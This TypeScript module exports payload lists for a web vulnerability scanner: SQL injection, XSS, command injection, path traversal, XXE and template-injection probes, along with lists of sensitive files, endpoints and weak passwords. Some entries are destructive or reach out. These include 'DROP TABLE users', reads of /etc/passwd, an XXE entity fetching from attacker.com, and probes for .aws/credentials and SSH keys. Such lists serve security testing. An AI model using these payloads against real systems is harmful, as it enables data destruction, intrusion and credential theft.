/**
 * Comprehensive Security Testing Payloads
 * Curated lists for various vulnerability types
 */

export const SQL_INJECTION_PAYLOADS = [
  // Error-based detection
  "'",
  "1'",
  "1' AND '1'='1",
  "1' AND '1'='2",
  
  // Union-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  
  // Boolean-based blind
  "1' OR '1'='1",
  "1' OR '1'='2",
  "' OR 1=1--",
  "admin'--",
  
  // Time-based blind
  "1' AND SLEEP(5)--",
  "'; WAITFOR DELAY '00:00:05'--",
  
  // Comment injection
  "admin'/*",
  "admin'#",
  
  // Stacked queries
  "'; DROP TABLE users--",
  "1; DELETE FROM users WHERE 1=1--",
]

export const SQL_ERROR_SIGNATURES = [
  'sql syntax',
  'mysql_fetch',
  'mysql_num_rows',
  'mysqli',
  'postgresql',
  'pg_query',
  'ora-',
  'oracle',
  'sqlite',
  'sqlstate',
  'unclosed quotation',
  'quoted string not properly terminated',
  'syntax error',
  'database error',
  'odbc',
  'jdbc',
  'warning: mysql',
  'warning: pg',
  'microsoft access',
]

export const XSS_PAYLOADS = [
  // Basic XSS
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  
  // Event handlers
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  
  // Encoded variants
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  
  // Bypasses
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x:alert(1) onerror=eval(src)>',
  '<svg><script>alert(1)</script></svg>',
  
  // DOM-based
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
]

export const COMMAND_INJECTION_PAYLOADS = [
  '; ls',
  '| ls',
  '& ls',
  '&& ls',
  '; cat /etc/passwd',
  '| cat /etc/passwd',
  '; id',
  '`id`',
  '$(id)',
  '; whoami',
  '| whoami',
  '; ping -c 1 127.0.0.1',
]

export const PATH_TRAVERSAL_PAYLOADS = [
  '../',
  '../../',
  '../../../',
  '../../../../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '....//....//....//etc/passwd',
  '%2e%2e%2f',
  '%252e%252e%252f',
  '..;/',
]

export const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(&',
  '*)(objectClass=*',
  '*()|&',
  'admin*',
  'admin*)((|userPassword=*',
]

export const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><foo>&xxe;</foo>',
]

export const SSTI_PAYLOADS = [
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '${{7*7}}',
  '#{7*7}',
  '{7*7}',
]

export const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt":""}',
  '{"$ne":null}',
  '{"$regex":".*"}',
  '{"$where":"1==1"}',
]

export const COMMON_API_ENDPOINTS = [
  '/api',
  '/api/v1',
  '/api/v2',
  '/graphql',
  '/swagger',
  '/swagger-ui',
  '/api-docs',
  '/docs',
  '/api/users',
  '/api/admin',
  '/api/config',
  '/api/debug',
  '/api/status',
  '/api/health',
  '/api/version',
  '/.well-known',
  '/actuator',
  '/metrics',
]

export const SENSITIVE_FILES = [
  '/.env',
  '/.git/config',
  '/.git/HEAD',
  '/config.json',
  '/config.yml',
  '/config.yaml',
  '/wp-config.php',
  '/database.yml',
  '/.aws/credentials',
  '/.ssh/id_rsa',
  '/id_rsa',
  '/backup.sql',
  '/dump.sql',
  '/phpinfo.php',
]

export const COMMON_SUBDOMAINS = [
  'www',
  'mail',
  'ftp',
  'admin',
  'api',
  'dev',
  'staging',
  'test',
  'beta',
  'alpha',
  'demo',
  'cdn',
  'static',
  'media',
  'assets',
  'portal',
  'vpn',
  'remote',
  'git',
  'gitlab',
  'jenkins',
  'travis',
]

export const HTTP_METHODS_TO_TEST = [
  'GET',
  'POST',
  'PUT',
  'DELETE',
  'PATCH',
  'OPTIONS',
  'HEAD',
  'TRACE',
  'CONNECT',
]

export const WEAK_PASSWORDS = [
  'admin',
  'password',
  '123456',
  'admin123',
  'root',
  'test',
  'guest',
  'password123',
  '12345678',
]
